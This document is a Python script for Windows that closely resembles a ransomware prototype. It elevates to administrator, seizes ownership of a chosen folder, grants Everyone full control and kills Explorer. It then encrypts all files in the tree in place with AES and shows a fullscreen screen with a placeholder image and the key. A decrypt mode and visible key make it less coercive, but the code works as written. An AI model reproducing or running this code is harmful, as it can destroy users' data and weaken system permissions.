import os
import sys
import ctypes
import subprocess
import psutil
import time
import tkinter as tk
from PIL import Image, ImageTk
from tkinter import scrolledtext
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from concurrent.futures import ThreadPoolExecutor

# Windows API for modifying file attributes
FILE_ATTRIBUTE_NORMAL = 0x80
SetFileAttributes = ctypes.windll.kernel32.SetFileAttributesW

def run_as_admin():
    """Ensure script runs with administrator privileges."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    print("🔴 Restarting with administrator privileges...")
    subprocess.run(["powershell", "-Command", f"Start-Process python -ArgumentList '{sys.argv[0]}' -Verb RunAs"], shell=True)
    sys.exit()

def take_ownership_and_permissions(path):
    """Take ownership and grant full control over a folder or file."""
    try:
        if os.path.isdir(path):
            subprocess.run(f'takeown /F "{path}" /A /R /D Y', shell=True, check=True)
        else:
            subprocess.run(f'takeown /F "{path}" /A', shell=True, check=True)  # No `/D Y` for files
        subprocess.run(f'icacls "{path}" /grant Everyone:F /T /C /Q', shell=True, check=True)
        subprocess.run(f'attrib -S -H -R "{path}" /S /D', shell=True, check=True)
    except Exception as e:
        print("Error:", str(e))


def modify_file_permissions(file_path):
    """Modify file attributes to make them writable."""
    try:
        SetFileAttributes(str(file_path), FILE_ATTRIBUTE_NORMAL)
    except Exception as e:
        print(f"⚠️ Failed to modify attributes for {file_path}: {e}")

def kill_explorer():
    """Kill Windows Explorer process."""
    subprocess.run("taskkill /f /im explorer.exe", shell=True)

def restart_explorer():
    """Restart Windows Explorer process."""
    subprocess.run("start explorer.exe", shell=True)

def encrypt_file(file_path, key, success_list, fail_list):
    """Encrypt a file using AES-256, ensuring it's not already encrypted."""
    try:
        file_path = Path(file_path)
        if not file_path.exists():
            return

        take_ownership_and_permissions(file_path)
        modify_file_permissions(file_path)

        with open(file_path, "rb") as f:
            data = f.read()

        if file_path.stat().st_size == 0:
            fail_list.append(file_path)
            return

        # Check if the file is already encrypted (by looking for the "ENC!" marker)
        if data[:4] == b"ENC!":
            print(f"⚠️ File {file_path} is already encrypted. Skipping...")
            fail_list.append(file_path)
            return

        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))

        # Add "ENC!" marker at the beginning to identify encrypted files
        with open(file_path, "wb") as f:
            f.write(b"ENC!" + iv + encrypted_data)

        success_list.append(file_path)
       

    except Exception:
        fail_list.append(file_path)
    print(f"\n🔑 Save this key to decrypt your files: {key.hex()}\n")

def decrypt_file(file_path, key, success_list, fail_list):
    """Decrypt a file using AES-256, ensuring it's not already decrypted."""
    try:
        file_path = Path(file_path)
        if not file_path.exists():
            return

        take_ownership_and_permissions(file_path)
        modify_file_permissions(file_path)

        with open(file_path, "rb") as f:
            data = f.read()

        if len(data) < AES.block_size + 4:  # Minimum size for encrypted data
            fail_list.append(file_path)
            return

        # Check if the file is already decrypted (does not start with "ENC!")
        if data[:4] != b"ENC!":
            print(f"⚠️ File {file_path} is already decrypted. Skipping...")
            fail_list.append(file_path)
            return

        iv = data[4:20]  # Extract IV (skip "ENC!" header)
        encrypted_data = data[20:]  # Actual encrypted content

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

        with open(file_path, "wb") as f:
            f.write(decrypted_data)

        success_list.append(file_path)

    except Exception:
        fail_list.append(file_path)


def get_all_files(folder_path):
    """Retrieve all files in a directory recursively."""
    return [str(f) for f in Path(folder_path).rglob("*") if f.is_file()]

import tkinter as tk
from PIL import Image, ImageTk

def show_result_window(success_list, fail_list, key, elapsed_time, total_time):
    root = tk.Tk()
    root.title("Process Complete")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")

    # 🖼️ Load and set image as full background
    try:
        bg_img = Image.open(r"TO_YOUR_IMG_PATH")#YOUR IMAGE PATH HERE
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        bg_img = bg_img.resize((screen_width, screen_height), Image.LANCZOS)
        bg_img = ImageTk.PhotoImage(bg_img)

        bg_label = tk.Label(root, image=bg_img)
        bg_label.image = bg_img
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)
    except Exception as e:
        print(f"⚠️ Image load failed: {e}")

    # Frame that floats above the background with some transparency illusion
    frame = tk.Frame(root, bg="black")  # use semi-transparent-like dark background
    frame.pack(fill="both", expand=True, padx=30, pady=30)

    title_label = tk.Label(frame, text="PROCESS COMPLETE", font=("Arial", 32, "bold"), fg="white", bg="black")
    title_label.pack(pady=10)

    time_label = tk.Label(frame, text=f"Process Time: {elapsed_time:.2f} sec | Total Time: {total_time:.2f} sec",
                          font=("Arial", 18), fg="white", bg="black")
    time_label.pack()

    key_label = tk.Label(frame, text=f"Encryption Key: {key.hex()}", font=("Arial", 18, "bold"), fg="red", bg="black")
    key_label.pack()

    count_label = tk.Label(frame, text=f"Files Processed: {len(success_list)} | Failed: {len(fail_list)}",
                           font=("Arial", 18), fg="white", bg="black")
    count_label.pack()

    # Scrollable frame setup
    scroll_frame = tk.Frame(frame, bg="black")
    scroll_frame.pack(fill="both", expand=True, padx=20, pady=10)

    canvas = tk.Canvas(scroll_frame, bg="black", highlightthickness=0)
    scrollbar = tk.Scrollbar(scroll_frame, orient="vertical", command=canvas.yview)

    scrollable_frame = tk.Frame(canvas, bg="black")

    scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
    canvas.configure(yscrollcommand=scrollbar.set)

    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")

    for file in success_list:
        tk.Label(scrollable_frame, text=file, font=("Arial", 12), fg="green", bg="black",
                 wraplength=800, justify="left").pack(anchor="w", padx=10, pady=2)

    for file in fail_list:
        tk.Label(scrollable_frame, text=file, font=("Arial", 12), fg="red", bg="black",
                 wraplength=800, justify="left").pack(anchor="w", padx=10, pady=2)

    legend_label = tk.Label(frame, text="✅ Success (Green) | ❌ Failed (Red)", font=("Arial", 14), fg="white", bg="black")
    legend_label.pack(pady=10)

    exit_button = tk.Button(frame, text="OK", font=("Arial", 16), bg="red", fg="white", command=root.destroy)
    exit_button.pack(pady=20)

    root.mainloop()

def get_encryption_key():
    """Ask user to use their own key or generate a new one."""
    choice = input("Do you want to provide your own key? (y/n): ").strip().lower()
    if choice == 'y':
        user_key = input("Enter a 64-character hex key (32 bytes): ").strip()
        try:
            key = bytes.fromhex(user_key)
            if len(key) != 32:
                raise ValueError("Key must be exactly 32 bytes (64 hex characters).")
            return key
        except Exception as e:
            print(f"❌ Invalid key: {e}")
            sys.exit(1)
    else:
        key = os.urandom(32)
        print(f"\n🔐 Generated encryption key: {key.hex()}")
        print("⚠️ Save this key! You will need it to decrypt your files.\n")
        return key
def main():
    run_as_admin()

    mode = input("Select mode (encrypt/decrypt): ").strip().lower()
    if mode not in ["encrypt", "decrypt"]:
        print("❌ Invalid mode! Choose 'encrypt' or 'decrypt'.")
        return

    folder_path = input("Enter folder path: ").strip('"')
    if not os.path.exists(folder_path):
        print("❌ Invalid folder path!")
        return

    take_ownership_and_permissions(folder_path)

    if mode == "encrypt":
        key = get_encryption_key()
    else:
        try:
            key_input = input("Enter decryption key (64 hex chars): ").strip()
            key = bytes.fromhex(key_input)
            if len(key) != 32:
                raise ValueError("Key must be 32 bytes (64 hex characters).")
        except Exception as e:
            print(f"❌ Invalid decryption key: {e}")
            return

    files = get_all_files(folder_path)
    print(f"📝 Found {len(files)} files in {folder_path}")

    kill_explorer()

    start_time = time.time()
    success_list, fail_list = [], []

    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        for file in files:
            executor.submit(encrypt_file if mode == "encrypt" else decrypt_file, file, key, success_list, fail_list)

    elapsed_time = time.time() - start_time
    restart_explorer()

    show_result_window(success_list, fail_list, key, elapsed_time, time.time() - start_time)
if __name__ == "__main__":
    main()
    input("Press Enter to continue: ")
